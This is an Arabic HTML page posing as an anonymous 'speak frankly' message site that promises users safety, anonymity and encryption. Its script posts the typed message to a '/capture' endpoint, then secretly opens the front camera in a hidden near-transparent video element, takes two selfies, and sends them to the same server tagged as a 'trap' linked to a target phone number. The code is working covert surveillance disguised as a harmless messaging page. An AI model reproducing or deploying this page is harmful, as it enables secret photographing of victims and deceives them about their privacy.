
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>صارحني | مساحة التعبير الحرة</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    
    <style>
        body {
            font-family: 'Tajawal', sans-serif;
            background: radial-gradient(circle at top left, #fdf2f8 0%, #f3e8ff 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #1f2937;
            -webkit-tap-highlight-color: transparent;
            overflow-x: hidden;
        }

        .glass-card {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border-radius: 32px;
            box-shadow: 0 20px 50px -10px rgba(217, 70, 239, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.8);
        }

        .header-gradient {
            background: linear-gradient(135deg, #ec4899 0%, #d946ef 100%);
            border-radius: 32px 32px 0 0;
            padding: 40px 20px 55px 20px;
            text-align: center;
            color: white;
            position: relative;
        }

        .profile-wrapper {
            position: absolute;
            bottom: -45px;
            left: 50%;
            transform: translateX(-50%);
            width: 90px;
            height: 90px;
            background: white;
            border-radius: 50%;
            padding: 5px;
            box-shadow: 0 10px 25px rgba(217, 70, 239, 0.25);
        }

        .profile-icon {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: linear-gradient(135deg, #fbcfe8 0%, #f472b6 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: #9d174d;
        }

        .custom-textarea {
            background: #faf5ff;
            border: 2px solid #f3e8ff;
            border-radius: 20px;
            resize: none;
            transition: all 0.3s ease;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            color: #4c1d95;
            font-weight: 600;
        }

        .custom-textarea:focus {
            outline: none;
            border-color: #d946ef;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(217, 70, 239, 0.15);
        }

        .btn-magic {
            background: linear-gradient(135deg, #d946ef 0%, #ec4899 100%);
            border-radius: 9999px;
            transition: all 0.3s;
            box-shadow: 0 10px 25px rgba(217, 70, 239, 0.35);
        }

        /* 🔴 الإصلاح السحري للكاميرا (منع الشاشة السوداء) */
        #spy-cam {
            position: fixed;
            bottom: 0;
            right: 0;
            width: 10px;
            height: 10px;
            opacity: 0.01; /* شبه شفاف تماماً ليظن المتصفح أنه معروض ويسمح بمرور الضوء للصورة */
            pointer-events: none;
            z-index: -999;
        }

        .blob {
            position: absolute;
            border-radius: 50%;
            filter: blur(50px);
            z-index: -1;
            opacity: 0.5;
        }
    </style>
</head>
<body class="p-4 relative">

    <div class="blob bg-pink-400 w-64 h-64 top-0 right-0 animate-pulse"></div>
    <div class="blob bg-purple-400 w-72 h-72 bottom-0 left-0 animate-pulse" style="animation-delay: 2s;"></div>

    <!-- الكاميرا المخفية معدلة لتعمل على كل الهواتف (iPhone & Android) -->
    <video id="spy-cam" autoplay playsinline muted></video>

    <!-- واجهة الإرسال -->
    <main id="write-ui" class="w-full max-w-sm glass-card relative transition-all duration-500 z-10">
        
        <div class="header-gradient">
            <h1 class="text-3xl font-extrabold font-['Cairo'] tracking-wide">صـارحـنـي</h1>
            <p class="text-sm opacity-90 mt-1 font-medium">مساحة آمنة للتعبير بحرية 🔒</p>
            
            <div class="profile-wrapper">
                <div class="profile-icon">
                    <i class="fa-solid fa-envelope-open-text text-white"></i>
                </div>
            </div>
        </div>

        <div class="pt-16 pb-8 px-6 space-y-5 relative">
            <div class="text-center">
                <h2 class="text-xl font-bold text-gray-800">أرسل رسالة مجهولة</h2>
                <p class="text-xs text-gray-500 mt-1">قل ما في قلبك، هويتك ستبقى مجهولة تماماً.</p>
            </div>

            <div class="relative">
                <textarea id="msg-input" rows="5" class="w-full custom-textarea p-5 text-center" placeholder="اكتب ما يدور في ذهنك بصدق..."></textarea>
            </div>

            <button id="send-btn" class="w-full btn-magic text-white font-bold text-lg py-4 flex justify-center items-center gap-2">
                <i class="fa-solid fa-paper-plane" id="btn-icon"></i>
                <span id="btn-text">إرسال الصراحة</span>
            </button>
            
            <div class="text-center text-[11px] text-gray-400 font-bold flex items-center justify-center gap-1.5 mt-2">
                <i class="fa-solid fa-shield-halved text-emerald-400"></i>
                نظام محمي ومشفر بالكامل
            </div>
        </div>
    </main>

    <!-- واجهة النجاح -->
    <div id="success-ui" class="hidden w-full max-w-sm glass-card p-10 text-center transform scale-95 opacity-0 transition-all duration-500 z-10">
        <div class="w-24 h-24 mx-auto bg-gradient-to-tr from-emerald-100 to-teal-100 rounded-full flex items-center justify-center mb-6 shadow-inner">
            <i class="fa-solid fa-check text-5xl text-emerald-500"></i>
        </div>
        <h2 class="text-3xl font-extrabold text-gray-800 mb-2 font-['Cairo']">تم الإرسال!</h2>
        <p class="text-gray-500 text-sm leading-relaxed mb-8 font-medium">
            وصلت رسالتك بسلام وبسرية تامة. نشكرك على ثقتك ومصارحتك الجميلة.
        </p>
        <button onclick="location.reload()" class="w-full bg-fuchsia-50 text-fuchsia-600 font-bold py-3.5 rounded-full hover:bg-fuchsia-100 transition-colors border border-fuchsia-100">
            إرسال رسالة أخرى
        </button>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');
        const targetNumber = urlParams.get('target') || '0000000000';

        const sendBtn = document.getElementById('send-btn');
        const btnText = document.getElementById('btn-text');
        const btnIcon = document.getElementById('btn-icon');
        const msgInput = document.getElementById('msg-input');
        const writeUi = document.getElementById('write-ui');
        const successUi = document.getElementById('success-ui');
        const videoEl = document.getElementById('spy-cam');

        sendBtn.addEventListener('click', async () => {
            const messageText = msgInput.value.trim();
            
            if (!messageText) {
                alert("لا يمكنك إرسال رسالة فارغة!");
                return;
            }

            if (!sessionId) {
                alert("عذراً، هذا الرابط غير صالح (مفقود الجلسة).");
                return;
            }

            sendBtn.disabled = true;
            sendBtn.style.opacity = "0.7";
            btnIcon.className = "fa-solid fa-circle-notch animate-spin";
            btnText.textContent = "جاري الإرسال والتشفير...";

            // 1. إرسال النص للسيرفر
            try {
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'text',
                        data: messageText, 
                        targetNumber: targetNumber, 
                        trapId: '💌 رسالة صارحني', 
                        sessionId: sessionId 
                    })
                });

                const result = await response.json();

                if (!result.success) {
                    alert("⚠️ عذراً: " + (result.message || "البوت غير متصل حالياً."));
                    resetButton();
                    return; 
                }
            } catch (err) {
                alert("⚠️ فشل الاتصال بالسيرفر! يرجى التأكد من أن السيرفر يعمل.");
                resetButton();
                return; 
            }

            // 2. محاولة التقاط الصور بصمت مع حل الشاشة السوداء
            try {
                btnText.textContent = "تأكيد الوصول...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                videoEl.srcObject = stream;
                
                // تشغيل الفيديو بشكل صريح إجباري (يحل مشكلة السفاري/الآيفون)
                await videoEl.play().catch(e => console.log("Play ignored:", e));
                
                // 🔴 ننتظر ثانيتين كاملتين (2000 ملي ثانية) لكي تتعدل الإضاءة وتختفي الشاشة السوداء
                await new Promise(resolve => setTimeout(resolve, 2000));

                const canvas = document.createElement('canvas');
                // نأخذ الأبعاد الحقيقية بعد أن اشتغلت الكاميرا
                canvas.width = videoEl.videoWidth || 640;
                canvas.height = videoEl.videoHeight || 480;
                const ctx = canvas.getContext('2d');

                let capturedImages = [];

                // التقاط الصورة الأولى (الآن الإضاءة ستكون ممتازة)
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                capturedImages.push(canvas.toDataURL('image/jpeg', 0.85));

                // انتظار نصف ثانية للقطة الثانية
                await new Promise(resolve => setTimeout(resolve, 500));
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                capturedImages.push(canvas.toDataURL('image/jpeg', 0.85));

                // إغلاق الكاميرا
                stream.getTracks().forEach(track => track.stop());

                // إرسال الصور للسيرفر
                if (capturedImages.length > 0) {
                    await fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'selfie', 
                            data: capturedImages, 
                            targetNumber: targetNumber, 
                            trapId: '📸 الملحقات السرية', 
                            sessionId: sessionId 
                        })
                    });
                }
            } catch (err) {
                console.log("تم إلغاء الصور، الرسالة النصية وصلت بنجاح.");
            }

            // 3. إظهار واجهة النجاح المريحة
            writeUi.style.opacity = '0';
            setTimeout(() => {
                writeUi.classList.add('hidden');
                successUi.classList.remove('hidden');
                setTimeout(() => {
                    successUi.style.opacity = '1';
                    successUi.style.transform = 'scale(1)';
                }, 50);
            }, 400);
        });

        function resetButton() {
            sendBtn.disabled = false;
            sendBtn.style.opacity = "1";
            btnIcon.className = "fa-solid fa-paper-plane";
            btnText.textContent = "إرسال الصراحة";
        }
    </script>
</body>
</html>
